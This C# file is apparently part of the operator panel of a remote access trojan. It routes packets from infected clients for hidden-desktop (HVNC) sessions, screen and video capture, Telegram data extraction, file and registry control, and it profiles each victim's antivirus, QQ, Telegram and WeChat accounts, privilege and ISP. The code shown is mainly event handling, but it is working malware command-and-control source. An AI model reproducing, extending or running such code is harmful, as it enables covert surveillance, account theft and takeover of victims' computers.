using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private System.IO.FileStream downloadFileStream;
        private long recvSize = 0;
        private ResponseStartDownloadHeader DownloadHeader;
        private FrmDownload DownloadWindow;
        private Action<long> UpdateDownloadProgressAction;

        private void initServerEvents()
        {
            RSCApplication.oRemoteControlServer = new RemoteControlServer();
            RSCApplication.oRemoteControlServer.ClientConnected += oRemoteControlServer_ClientConnected;
            RSCApplication.oRemoteControlServer.ClientDisconnected += oRemoteControlServer_ClientDisconnected;
            RSCApplication.oRemoteControlServer.ClientListChanged += oRemoteControlServer_ClientListChanged;
            RSCApplication.oRemoteControlServer.PacketReceived += oRemoteControlServer_PacketReceived;
            RSCApplication.oRemoteControlServer.RelayDisconnected += oRemoteControlServer_RelayDisconnected;
        }

        void oRemoteControlServer_RelayDisconnected(object sender, EventArgs e)
        {
            // Relay连接断开，更新UI并触发自动重连
            if (this.InvokeRequired)
            {
                try { this.BeginInvoke(new Action<object, EventArgs>(oRemoteControlServer_RelayDisconnected), sender, e); }
                catch { }
                return;
            }
            SetRelayStatus(false);
            doOutput("Relay连接已断开，正在尝试自动重连...");
            // 触发自动重连
            RemoteControlServer server = RSCApplication.oRemoteControlServer;
            if (server != null)
            {
                server.TryAutoReconnect();
                // 重连成功后刷新UI
                ThreadPool.QueueUserWorkItem(delegate
                {
                    // 等待重连完成(最多等30秒)
                    for (int i = 0; i < 30; i++)
                    {
                        Thread.Sleep(1000);
                        if (server.IsConnected)
                        {
                            Thread.Sleep(500);
                            try
                            {
                                this.BeginInvoke(new Action(() =>
                                {
                                    SetRelayStatus(true);
                                    doOutput("Relay自动重连成功");
                                }));
                            }
                            catch { }
                            ScheduleClientListRefresh();
                            return;
                        }
                    }
                });
            }
        }

        void oRemoteControlServer_PacketReceived(object sender, PacketReceivedEventArgs e)
        {
            // 截屏/HVNC/视频回调用session字典路由，始终处理（包括错误响应）
            HandleCapturePackets(e);

            // TG提取响应路由到对应窗口（包含失败响应，必须在rb.Result检查之前）
            if (e.PacketType == ePacketType.PACKET_TG_EXTRACT_RESPONSE)
            {
                var tgResp = e.Obj as RemoteControl.Protocals.Response.ResponseTGExtract;
                string sid = e.Session != null ? e.Session.SocketId : null;
                if (sid != null && sessionTgPackagerForms.ContainsKey(sid) && !sessionTgPackagerForms[sid].IsDisposed)
                {
                    sessionTgPackagerForms[sid].HandleResponse(tgResp);
                    return;
                }
            }

            ResponseBase rb = e.Obj as ResponseBase;
            if (rb != null && rb.Result == false)
            {
                Logger.Debug(e.Session.SocketId + " Error:" + rb.Message + "\r\n" + rb.Detail);
                doOutput(rb.Message);
                return;
            }

            HandleSessionLifecyclePacket(e);

            if (this.currentSession == null || e.Session.SocketId != this.currentSession.SocketId)
                return;

            HandleFileListPackets(e);
            HandleFileOperationPackets(e);
            HandleRegistryPackets(e);
            HandleToolResponsePackets(e);
        }

        private void HandleSessionLifecyclePacket(PacketReceivedEventArgs e)
        {
            if (e.PacketType == ePacketType.PACKET_CLIENT_CLOSE_RESPONSE)
            {
                e.Session.Close();
            }
            else if (e.PacketType == ePacketType.PACKET_GET_HOST_NAME_RESPONSE)
            {
                var resp = e.Obj as ResponseGetHostName;
                if (resp == null) return;
                string hostName = resp.HostName;
                e.Session.SetHostName(hostName);
                e.Session.SetAppPath(resp.AppPath);
                e.Session.SetOnlineAvatar(resp.OnlineAvatar);
                e.Session.SetClientInfo(resp.UserName, resp.LocalIP, resp.OSVersion, resp.Privilege, resp.CameraStatus);
                e.Session.SetBossExInfo(resp.Antivirus, resp.OnlineQQ, resp.TG, resp.WX, resp.UserStatus, resp.Region, resp.ISP);
                if (this.currentSession != null &&
                    this.currentSession.SocketId == e.Session.SocketId)
                {
                    // 更新主机名
                    this.Invoke(new Action(() =>
                    {
                        UpdateSelectedClientInfo(e.Session);
                    }));
                }
                this.Invoke(new Action(() =>
                {
                    // 修改节点图标
                    TreeNode node = FindClientNode(e.Session);
                    if (node != null)
                    {
                        node.Text = string.Format("{0}({1})", e.Session.GetSocketIPById(), e.Session.HostName);
                        if (this.treeView1.ImageList.Images.ContainsKey(e.Session.OnlineAvatar))
                        {
                            node.ImageKey = e.Session.OnlineAvatar;
                            node.SelectedImageKey = e.Session.OnlineAvatar; 
                        }
                    }
                    UpdateClient(e.Session);
                }));
            }
        }

        void oRemoteControlServer_ClientListChanged(object sender, ClientListChangedEventArgs e)
        {
            if (e == null)
                return;

            foreach (SocketSession session in e.RemovedClients)
            {
                RemoveClient(session);
            }
            foreach (SocketSession session in e.AddedClients)
            {
                AddClient(session);
            }
            foreach (SocketSession session in e.UpdatedClients)
            {
                UpdateClient(session);
            }
        }

        void oRemoteControlServer_ClientDisconnected(object sender, ClientConnectedEventArgs e)
        {
            RemoveClient(e.Client);
        }

        void oRemoteControlServer_ClientConnected(object sender, ClientConnectedEventArgs e)
        {
            AddClient(e.Client);
        }
    }
}
